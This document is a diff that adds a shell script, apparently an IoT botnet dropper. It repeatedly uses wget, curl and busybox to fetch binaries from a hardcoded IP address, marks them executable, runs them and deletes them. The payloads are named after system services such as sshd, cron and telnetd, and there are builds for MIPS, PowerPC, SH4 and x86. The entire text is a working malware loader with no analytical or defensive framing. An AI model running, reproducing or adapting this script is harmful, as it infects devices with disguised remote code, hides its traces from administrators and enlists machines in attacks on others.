@@ -1,0 +1,63 @@
+rm -rf binaries.sh
+wget http://185.165.29.50/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+wget http://185.165.29.50/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+wget http://185.165.29.50/openssh; chmod +x openssh; ./openssh; rm -rf openssh
+wget http://185.165.29.50/bash; chmod +x bash; ./bash; rm -rf bash
+wget http://185.165.29.50/tftp; chmod +x tftp; ./tftp; rm -rf tftp
+wget http://185.165.29.50/wget; chmod +x wget; ./wget; rm -rf wget
+wget http://185.165.29.50/cron; chmod +x cron; ./cron; rm -rf cron
+wget http://185.165.29.50/ftp; chmod +x ftp; ./ftp; rm -rf ftp
+wget http://185.165.29.50/pftp; chmod +x pftp; ./pftp; rm -rf pftp
+wget http://185.165.29.50/sh; chmod +x sh; ./sh; rm -rf sh
+wget http://185.165.29.50/' '; chmod +x ' '; ./' '; rm -rf ' '
+wget http://185.165.29.50/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+wget http://185.165.29.50/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+wget http://185.165.29.50/k; chmod +x k; ./k; rm -rf k
+curl http://185.165.29.50/ntpd -O ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+curl http://185.165.29.50/sshd -O sshd; chmod +x sshd; ./sshd; rm -rf sshd
+curl http://185.165.29.50/openssh -O openssh; chmod +x openssh; ./openssh; rm -rf openssh
+curl http://185.165.29.50/bash -O bash; chmod +x bash; ./bash; rm -rf bash
+curl http://185.165.29.50/tftp -O tftp; chmod +x tftp; ./tftp; rm -rf tftp
+curl http://185.165.29.50/wget -O wget; chmod +x wget; ./wget; rm -rf wget
+curl http://185.165.29.50/cron -O cron; chmod +x cron; ./cron; rm -rf cron
+curl http://185.165.29.50/ftp -O ftp; chmod +x ftp; ./ftp; rm -rf ftp
+curl http://185.165.29.50/pftp -O pftp; chmod +x pftp; ./pftp; rm -rf pftp
+curl http://185.165.29.50/sh -O sh; chmod +x sh; ./sh; rm -rf sh
+curl http://185.165.29.50/' ' -O ' '; chmod +x ' '; ./' '; rm -rf ' '
+curl http://185.165.29.50/apache2 -O apache2; chmod +x apache2; ./apache2; rm -rf apache2
+curl http://185.165.29.50/telnetd -O telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+busybox wget http://185.165.29.50/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
+busybox wget http://185.165.29.50/sshd; chmod +x sshd; ./sshd; rm -rf sshd
+busybox wget http://185.165.29.50/openssh; chmod +x openssh; ./openssh; rm -rf openssh
+busybox wget http://185.165.29.50/bash; chmod +x bash; ./bash; rm -rf bash
+busybox wget http://185.165.29.50/tftp; chmod +x tftp; ./tftp; rm -rf tftp
+busybox wget http://185.165.29.50/wget; chmod +x wget; ./wget; rm -rf wget
+busybox wget http://185.165.29.50/cron; chmod +x cron; ./cron; rm -rf cron
+busybox wget http://185.165.29.50/ftp; chmod +x ftp; ./ftp; rm -rf ftp
+busybox wget http://185.165.29.50/pftp; chmod +x pftp; ./pftp; rm -rf pftp
+busybox wget http://185.165.29.50/sh; chmod +x sh; ./sh; rm -rf sh
+busybox wget http://185.165.29.50/' '; chmod +x ' '; ./' '; rm -rf ' '
+busybox wget http://185.165.29.50/apache2; chmod +x apache2; ./apache2; rm -rf apache2
+busybox wget http://185.165.29.50/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
+wget http://185.165.29.50/jackmymips
+wget http://185.165.29.50/jackmymipsel
+wget http://185.165.29.50/jackmyi586
+wget http://185.165.29.50/jackmyi686
+wget http://185.165.29.50/jackmysh4
+wget http://185.165.29.50/jackmypowerpc
+wget http://185.165.29.50/jackmyx86
+chmod +x jackmymips
+chmod +x jackmymipsel
+chmod +x jackmyi686
+chmod +x jackmyi586
+chmod +x jackmysh4
+chmod +x jackmypowerpc
+chmod +x jackmyx86
+./jackmymips
+./jackmymipsel
+./jackmyi686
+./jackmyi586
+./jackmysh4
+./jackmypowerpc
+./jackmyx86
+rm -rf jackmy*
